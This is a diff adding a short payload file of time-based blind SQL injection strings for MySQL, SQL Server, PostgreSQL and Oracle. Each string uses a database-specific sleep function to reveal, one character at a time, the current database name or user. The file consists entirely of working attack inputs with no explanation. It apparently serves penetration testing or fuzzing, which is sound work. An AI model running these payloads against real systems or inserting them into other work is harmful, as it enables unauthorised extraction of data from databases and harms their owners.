@@ -1,0 +1,12 @@
+# MySQL
+' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77,SLEEP(5),0)-- 
+
+# SQL Server
+'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'-- 
+
+# PostgreSQL
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT current_user),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+
+# Oracle
+AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+
